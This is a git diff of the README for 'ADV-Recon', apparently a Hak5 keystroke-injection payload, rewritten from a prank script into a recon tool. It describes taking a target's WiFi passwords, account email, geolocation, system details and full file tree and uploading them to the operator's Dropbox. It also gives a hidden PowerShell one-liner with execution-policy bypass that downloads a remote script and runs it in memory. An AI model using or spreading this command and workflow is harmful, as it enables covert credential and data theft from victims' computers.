@@ -15,17 +15,16 @@
 
 # ADV-Recon
 
-A script I put together to torment Call Center Scammers but can be used on your friends as well.. or Foes.
+A script used to do an advanced level of Recon on the targets computer
 
 ## Description
 
 This program enumerates a target PC to include Operating System, RAM Capacity, Public IP, and Email associated with microsoft account.
+The GeoLocation (latitude and longitude) of where the script was ran.
 The SSID and WiFi password of any current or previously connected to networks.
 It determines the last day they changed thier password and how many days ago.
-Once the information is gathered the script will pause until a mouse movement is detected
-Then the script uses Sapi speak to roast their set up and lack of security
-If wifi networks and passwords are detected wallpaper will be changed to image displaying that information
-Image generated will be saved to desktop, steganography is used to put hidden message at bottom of binary output of image generated
+Intel on the system Info, HDDs, network interfaces, TCP connections, Processes, Services, Installed software, drivers, and video card 
+Along with TREE list of all files in the target computer is gathered and uploaded to your DropBox cloud storage
 
 ## Getting Started
 
@@ -38,7 +37,7 @@ Image generated will be saved to desktop, steganography is used to put hidden me
 
 ### Executing program
 
-* Plug in OMG Cable
+* Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
 ```
 powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
@@ -46,13 +45,8 @@ powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link fo
 * Enumerate and get Full Name, Amount of RAM, Public IP, Wifi Password Length, Wifi Networks and Passwords, Day Password was last changed, Email
 * Custom responses have been programmed to roast the target based on the information gathered during enumeration phase 
 * Wifi Networks and passwords will be generated into an image that will be saved on the desktop
-* Image opened in notepad will reveal a hidden message at the bottom of the binary output
-* Script will freeze until a mouse movement is detected 
-* Sapi Speak will be used to speak out loud the custom responses 
-* Desktop wallpaper will be changed to the image of the targets Wifi Networks and Passwords
-* Text file will be left on the target desktop with whatever message you choose
-
-![alt text](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG-AcidBurn/hacked-wallpaper.jpg)
+* Intel on the system Info, HDDs, network interfaces, TCP connections, Processes, Services, Installed software, drivers, and video card 
+* Along with TREE list of all files in the target computer is gathered and uploaded to your DropBox cloud storage
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
@@ -61,8 +55,6 @@ powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link fo
 All contributors names will be listed here
 
 I am Jakoby
-
-Arf
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
@@ -109,8 +101,5 @@ Arf
 
 * [Hak5](https://hak5.org/)
 * [MG](https://github.com/OMG-MG)
-* [0iphor13](https://github.com/0iphor13)
-* [PhilSutter](https://github.com/PhilSutter)
-
 
 <p align="right">(<a href="#top">back to top</a>)</p>
